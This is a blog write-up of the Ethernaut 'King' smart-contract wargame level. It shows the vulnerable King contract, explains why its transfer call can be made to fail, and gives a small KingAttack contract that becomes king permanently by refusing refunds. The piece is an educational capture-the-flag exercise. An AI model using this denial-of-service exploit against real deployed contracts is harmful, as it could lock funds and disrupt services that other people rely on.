<!doctype html><html lang=en><head><title>King - Ethernaut :: DimitrisV SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme. Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg."><meta name=keywords content="linux"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/king/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content="Dimitris Vagiakakos"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="King - Ethernaut"><meta property="og:description" content="We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme. Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract King { address payable king; uint public prize; address payable public owner; constructor() public payable { owner = msg."><meta property="og:url" content="/blockchain_writeups/king/"><meta property="og:site_name" content="DimitrisV SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-01-07 00:00:00 +0000 UTC"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Dimitris Vagiakakos SV1SJP</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/whoami>$whoami</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/whoami>$whoami</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/blockchain_writeups/king/>King - Ethernaut</a></h1><div class=post-meta><span class=post-date>2022-01-07</span>
<span class=post-author>:: Dimitris Vagiakakos</span></div><div class=post-content><div><p>We have a smart contract game called Kings. This contract is a classic example of a ponzi scheme.
Whoever sends an amount of ether that is more than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process.</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
</code></pre><p>It should be mentioned here that when we will try to submit King.sol instance back to level, Ethernaut will call the fallback function to regain Kingship. As we can understand, we have to find a way to guarantee that all Ethernaut&rsquo;s transactions will fail, so we can remain as a King. Let&rsquo;s check the code into fallback function:</p><pre tabindex=0><code>receive() external payable {
    require(msg.value &gt;= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
</code></pre><p>The fallback is an external payable and has as a requirement to be called that the sender sends a higher amount of ether than it is the current price and the msg.sender to be the owner. Then, all of the sended ether is transfered to king and we become the king and our value of ether is sets us the current prize. They key here is the &ldquo;king.transfer()&rdquo; method which can fail if the current king is a malicious contract and refuses to withdraw.
There are multiple ways for transactions to fail, but most of the time we have these 3 options:</p><ul><li>Out Of Gas Errors: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails the transaction or over-consumes the gas limit. However cannot make the internal call here as there is not really something we can control.</li><li>Arbitrary Error from FallBack Function. If our transaction ends up executing code from a contract that can always fail.</li><li>Transact with Contract with no fallback function or a non payable fallback function. When a transaction is made towards a contract address without including any data the fallback function of that contract is called. If a contract does not have a fallback function, it will fail. Also, It will fall if we send some ether in a transaction without a payable modifier in the fallback.</li><li>So, we can create a contract with a function that will send ether to the original contract, however without a fallback function so that the king contract cannot send money back.
We create and deploy a malicious smart contract with at least 1 Ether on it.</li></ul><pre tabindex=0><code>// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract KingAttack {

  function doYourThing(address _target) public payable {
    (bool result,) = _target.call{value:msg.value}(&#34;&#34;);
    if(!result) revert(&#34;MyBad&#34;);
  }

  
}
</code></pre><p>This script has a payable function which will send an ether to the contract. As the original smart contract has a payable external fallback function, but it has requirements in order to be executed, it will fail as it will can&rsquo;t handle the 1 ether that we sent it from the attacking contract. As a result, we will become the king forever.</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><p><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here</a></p></li><li><p><a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here</a></p></li></ul></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>TuxHouse - Dimitris LinuxOS - 2011-2023</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
<script src=/assets/languageSelector.js></script></div></body></html>